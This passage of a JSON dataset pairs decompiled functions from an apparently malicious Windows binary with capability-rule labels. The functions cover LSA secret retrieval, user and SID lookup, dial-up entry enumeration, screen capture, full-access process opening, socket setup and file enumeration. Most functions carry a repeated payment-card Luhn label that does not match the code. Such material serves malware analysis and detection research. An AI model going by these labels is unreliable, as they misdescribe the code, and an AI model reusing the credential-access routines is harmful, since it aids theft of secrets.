        "decompiled_code": "\nvoid __fastcall fcn.0045e9dc(uint *param_1)\n\n{\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    fcn.0045df60();\n    fcn.0045df84();\n    fcn.0045e018();\n    *param_1 = uStack28;\n    param_1[1] = uStack24;\n    param_1[2] = uStack20;\n    param_1[3] = uStack16;\n    return;\n}\n",
        "token_count": 121
    },
    "0045eb5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0045eb5c(void)\n\n{\n    uint8_t *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c();\n    pcVar1 = fcn.004058fc();\n    iVar2 = 0x10;\n    do {\n        *pcVar1 = \"0123456789abcdef\"[*in_EAX >> 4];\n        pcVar1[1] = \"0123456789abcdef\"[*in_EAX & 0xf];\n        pcVar1 = pcVar1 + 2;\n        in_EAX = in_EAX + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 164
    },
    "0045ed80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nvoid fcn.0045ed80(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY608;\n    uint uStack556;\n    uint uStack552;\n    uchar *puStack548;\n    uint var_218h;\n    uint pSid;\n    uint StringSid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack548 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack552 = 0x45ee55;\n    uStack556 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack556;\n    fcn.0040546c();\n    fcn.00405b8c();\n    var_8h = 0xff;\n    uVar1 = fcn.0040595c(&var_8h);\n    iVar2 = sub.advapi32.dll_GetUserNameA(uVar1);\n    if (iVar2 != 0) {\n        var_ch = 0xff;\n        var_10h = 0xff;\n        uVar1 = fcn.0040595c(&pSid, &var_ch, &var_218h, &var_10h, &var_14h);\n        iVar2 = sub.advapi32.dll_LookupAccountNameA(0, uVar1);\n        if (iVar2 != 0) {\n            iVar2 = sub.advapi32.dll_IsValidSid(&pSid);\n            if (iVar2 != 0) {\n                sub.advapi32.dll_ConvertSidToStringSidA(&pSid, &StringSid);\n                fcn.00405664();\n                uStackY608 = StringSid;\n                sub.kernel32.dll_GlobalFree();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY608;\n    fcn.0040546c(0x45ee5c);\n    return;\n}\n",
        "token_count": 431
    },
    "0045eea8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0045eea8(uint param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint uVar3;\n    uchar *puStack64;\n    uchar *puStack56;\n    uchar auStack52 [12];\n    uchar auStack40 [24];\n    \n    bVar2 = false;\n    puStack56 = 0x45eec7;\n    fcn.00403aac();\n    puStack64 = &stack0xffffffd8;\n    uVar3 = 0;\n    puStack56 = &stack0xffffffcc;\n    iVar1 = sub.advapi32.dll_LsaOpenPolicy(0);\n    if (iVar1 == 0) {\n        fcn.0045ee64();\n        iVar1 = sub.advapi32.dll_LsaRetrievePrivateData(uVar3, &stack0xffffffc0, param_1);\n        bVar2 = iVar1 == 0;\n        fcn.00402f0c();\n        sub.advapi32.dll_LsaClose(uVar3);\n    }\n    return bVar2;\n}\n",
        "token_count": 232
    },
    "0045f0d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045f0d4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack272;\n    uchar auStack268 [4];\n    uint auStack264 [66];\n    \n    uStack272 = 0x108;\n    auStack264[0] = 0x108;\n    uVar2 = 0;\n    iVar1 = sub.rasapi32.dll_RasEnumEntriesA(0, 0, auStack264, &uStack272, auStack268);\n    if ((iVar1 != 0x25b) && (iVar1 != 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 153
    },
    "0045fa44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fa44(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = 0x45fa64;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack68 = 0x45fa6c;\n    fcn.004058ec();\n    uStack72 = 0x45fb2e;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack68 = &stack0xfffffffc;\n    iVar2 = fcn.0045f8e8();\n    fcn.0045f9f0();\n    *(&fcn.0045fa44::var_29h + iVar2) = 0;\n    cVar1 = fcn.0045fa08();\n    if (cVar1 == '\\0') {\n        fcn.00405664(0x45fb54, var_4h, 0x45fb78);\n        uVar3 = 0x45fb6c;\n        fcn.00405800(0x45fb6c, 0x45fb60, 0);\n    }\n    else {\n        fcn.00405664(0x45fb54, var_4h, 0x45fb44);\n        uVar3 = 0x45fb6c;\n        fcn.00405800(0x45fb6c, 0x45fb60, 0);\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405490(0x45fb35);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 459
    },
    "00460270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460270(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4602ab;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4984e8 = *0x4984e8 + 1;\n    if (*0x4984e8 == 0) {\n        fcn.0040546c();\n        fcn.0040546c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 150
    },
    "004603c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004603c4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x4603e2;\n    fcn.004058ec();\n    uStack36 = 0x460449;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (param_2 != 0) {\n        iVar1 = 1;\n        iVar2 = param_2;\n        puStack32 = &stack0xfffffffc;\n        do {\n            fcn.004602b4();\n            fcn.00405738();\n            if (iVar1 != param_2) {\n                fcn.00405738();\n            }\n            iVar1 = iVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x460450;\n    uStack36 = 0x460440;\n    fcn.0040546c();\n    uStack36 = 0x460448;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 314
    },
    "00460ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00460ed0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int16_t iVar3;\n    \n    iVar1 = *(in_EAX + 0x3c);\n    uVar2 = fcn.00402ef0();\n    fcn.00403aac();\n    fcn.0040858c();\n    iVar3 = *(iVar1 + in_EAX + 6);\n    do {\n        fcn.0040858c();\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return CONCAT44(in_EAX, uVar2);\n}\n",
        "token_count": 146
    },
    "00461610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00461610(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uVar4;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint var_12ch;\n    uint var_128h;\n    uint uStack292;\n    uchar auStack264 [260];\n    \n    puStack316 = &stack0xfffffffc;\n    uStack320 = 0x46178c;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack324;\n    uVar3 = 1;\n    uVar1 = fcn.004614a0();\n    fcn.004614c0();\n    do {\n        func_0x00407fd4(auStack264);\n        fcn.00405664();\n        fcn.00405894();\n        if (uVar3) {\n            *0x498564 = sub.kernel32.dll_OpenProcess(0x10, 0, uStack292);\n            sub.kernel32.dll_CloseHandle_1(uVar1);\n            break;\n        }\n        iVar2 = fcn.004614e0();\n        uVar3 = iVar2 == 0;\n    } while (!uVar3);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x4617b0);\n    *0x498544 = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x4617d0);\n    *0x498558 = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x4617e4);\n    *0x49855c = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x4617f4);\n    *0x498548 = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x461804);\n    *0x49854c = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x461814);\n    *0x498550 = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x461828);\n    *0x498554 = fcn.00461540(uVar1, uVar4);\n    uVar4 = 0x4617c0;\n    uVar1 = sub.kernel32.dll_LoadLibraryA(0x4617c0, 0x46183c);\n    *0x498560 = fcn.00461540(uVar1, uVar4);\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c(0x461793);\n    return;\n}\n",
        "token_count": 799
    },
    "00461c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461c5c(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x461c71;\n    fcn.004058ec();\n    uStack28 = 0x461d11;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x461c8b;\n    puStack24 = &stack0xfffffffc;\n    piVar1 = fcn.00404610();\n    uStack40 = 0x461cf4;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0041bdd4();\n    uVar2 = (***piVar1)();\n    uVar3 = 0;\n    fcn.0041b674(0, 0);\n    fcn.00406a14(uVar2);\n    (**(*piVar1 + 0xc))();\n    *in_FS_OFFSET = uVar3;\n    uStack44 = 0x461cfb;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 331
    },
    "00461d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461d20(void)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x461d76;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar1 = (***in_EAX)();\n    uVar2 = 0;\n    fcn.0041b674(0, 0);\n    fcn.00406a14(uVar1);\n    (**(*in_EAX + 0xc))();\n    *in_FS_OFFSET = uVar2;\n    return;\n}\n",
        "token_count": 175
    },
    "00461f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461f64(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x461f7b;\n    fcn.004058ec();\n    uStack24 = 0x461fdc;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00403aac();\n    fcn.00461c5c();\n    fcn.00461e40();\n    fcn.00460f90();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x461fe3;\n    uStack24 = 0x461fdb;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 200
    },
    "00462278": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462278(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x46228d;\n    fcn.0040716c();\n    uStack24 = 0x4622ce;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uVar1 = *(in_EAX + 4);\n    puStack20 = &stack0xfffffffc;\n    sub.gdiplus.dll_GdipSaveImageToStream(uVar1, in_EDX);\n    fcn.00462304();\n    *in_FS_OFFSET = uVar1;\n    fcn.004070f8(0x4622d5, arg_8h);\n    return;\n}\n",
        "token_count": 215
    },
    "004623b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004623b4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromScan0(in_ECX, arg_ch, 0, arg_8h, 0, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.00462300();\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 229
    },
    "00462414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00462414(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    int32_t var_4h;\n    \n    if (param_2 != '\\0') {\n        var_4h = param_1;\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    var_4h = 0;\n    if (param_1 != 0) {\n        uVar1 = sub.gdiplus.dll_GdipGetImageGraphicsContext(*(param_1 + 4), &var_4h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.004624ec();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 244
    },
    "0046267c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0046267c(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_ECX;\n    arg_8h_00 = fcn.004622e0();\n    uVar1 = fcn.004623b4(arg_8h_00, uVar1);\n    fcn.00462414();\n    if (arg_8h == '\\x01') {\n        fcn.00462494();\n    }\n    else if (arg_8h == '\\x02') {\n        fcn.00462494();\n    }\n    else if (arg_8h == '\\x03') {\n        fcn.00462494();\n    }\n    iVar2 = fcn.004624b0(in_ECX, in_EDX, 0);\n    fcn.00404640();\n    fcn.00404640();\n    *in_EAX = uVar1;\n    return iVar2 == 0;\n}\n",
        "token_count": 258
    },
    "0046272c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046272c(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x4627fe;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00420354(0);\n    fcn.00407110();\n    fcn.00462310(0);\n    fcn.0046267c(0);\n    fcn.00462598();\n    fcn.00420354(0);\n    fcn.00407110();\n    uVar1 = 0;\n    fcn.00462278(0);\n    fcn.00404640();\n    *in_FS_OFFSET = uVar1;\n    fcn.00406018(0x462805);\n    return;\n}\n",
        "token_count": 239
    },
    "00462824": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462824(int32_t **param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4628b2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    var_4h = param_2;\n    fcn.00404610();\n    var_8h = fcn.00404610();\n    (**(**param_1 + 0x58))();\n    fcn.0041b674(0, 0);\n    fcn.0046272c(&var_8h);\n    uVar1 = 0;\n    fcn.0041b674(0, 0);\n    (**(**param_1 + 0x54))();\n    fcn.00404640();\n    fcn.00404640();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 253
    },
    "00462bdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00462bdc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f838();\n    *(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x31) = 0;\n    *(in_EAX + 0x34) = 0;\n    *(in_EAX + 0x38) = 0;\n    *(in_EAX + 0x3c) = 0;\n    *(in_EAX + 0x3e) = 0;\n    *(in_EAX + 0x40) = 0xffffffff;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x5c) = 0;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x6c) = 0;\n    fcn.0040f404();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 416
    },
    "00462e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00462e10(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00462bdc();\n    *(in_EAX + 0x3c) = 2;\n    *(in_EAX + 0x3e) = 0;\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.0040546c();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 201
    },
    "00462e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462e70(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x462e90;\n    fcn.004058ec();\n    puStack28 = 0x462e98;\n    fcn.004058ec();\n    uStack32 = 0x462f05;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *arg_8h = 2;\n    puStack28 = &stack0xfffffffc;\n    fcn.00462f14();\n    uVar2 = fcn.004058fc();\n    uVar2 = sub.wsock32.dll_inet_addr(uVar2);\n    *(arg_8h + 2) = uVar2;\n    uVar2 = fcn.00462fec();\n    uVar1 = sub.wsock32.dll_htons();\n    arg_8h[1] = uVar1;\n    *in_FS_OFFSET = uVar2;\n    uStack36 = 0x462f0c;\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 318
    },
    "00462f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "resolve DNS"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462f14(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.0040546c();\n    if (param_2 == NULL) {\n        fcn.004054c0();\n    }\n    else if (*param_2 - 0x30U < 10) {\n        uVar1 = fcn.004058fc();\n        iVar2 = sub.wsock32.dll_inet_addr(uVar1);\n        if (iVar2 != -1) {\n            fcn.004054c0();\n        }\n    }\n    else {\n        uVar1 = fcn.004058fc();\n        iVar2 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar2 != 0) {\n            fcn.0040af7c(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00463028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.00463028(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar auStack264 [256];\n    \n    fcn.0040546c();\n    sub.wsock32.dll_gethostname(auStack264, 0x100);\n    iVar1 = (**(*in_EAX + 0x38))();\n    if (iVar1 == 0) {\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "004630c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004630c4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00462e10();\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x88) = 0;\n    *(in_EAX + 0x8c) = 0;\n    *(in_EAX + 0x90) = 0;\n    *(in_EAX + 0x94) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "00463674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00463674(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.00463308();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**0x49872c)();\n    }\n    return uVar2;\n}\n",
        "token_count": 87
    },
    "004637c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004637c0(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint lpdwProcessId;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x4637d7;\n    var_8h = param_2;\n    fcn.004058ec();\n    uStack36 = 0x46386a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc();\n    uVar4 = 0;\n    iVar2 = sub.user32.dll_FindWindowA(0, uVar1);\n    if (iVar2 != 0) {\n        puVar3 = fcn.00402ef0();\n        *puVar3 = 0x28;\n        func_0x004082bc(iVar2, &fcn.004637c0::lpdwProcessId);\n        uStack40 = lpdwProcessId;\n        uVar4 = 0x1f0fff;\n        sub.kernel32.dll_OpenProcess(0x1f0fff, 0);\n        iVar2 = fcn.004636a4();\n        if (iVar2 == 0) {\n            *var_8h = 0;\n        }\n        else {\n            *var_8h = puVar3[3];\n        }\n        fcn.00402f0c();\n    }\n    *in_FS_OFFSET = uVar4;\n    uStack40 = 0x463871;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 413
    },
    "00463db8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00463db8(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint uStack788;\n    uint uStack784;\n    uchar *puStack780;\n    uint uStack776;\n    uint uStack772;\n    uchar *puStack768;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_1d0h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_170h;\n    uint var_16ch;\n    uint32_t var_168h;\n    uint var_164h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack780 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    puStack768 = 0x463df4;\n    fcn.004058ec();\n    puStack768 = 0x463e05;\n    fcn.00405f08();\n    uStack772 = 0x463fd5;\n    uStack776 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffcf8;\n    uStack784 = 0x463f68;\n    uStack788 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffcec;\n    puStack768 = &stack0xfffffffc;\n    fcn.00405784();\n    iVar1 = fcn.0040a400();\n    while (iVar1 == 0) {\n        if ((var_168h & 0x10) == 0) {\n            fVar3 = fcn.0040a734();\n            _var_180h = fVar3;\n            var_17ch = _var_180h >> 0x20;\n            fcn.0040c86c(var_180h, var_17ch);\n            fcn.00405504();\n            fcn.00405784(0, &fcn.00463db8::var_2e0h, 0x160, 0x400);\n            uVar2 = fcn.004058fc();\n            sub.shell32.dll_SHGetFileInfoA(uVar2);\n            fcn.004056dc();\n            fcn.00409dd4(var_170h);\n            uStack788 = 0x463ff8;\n            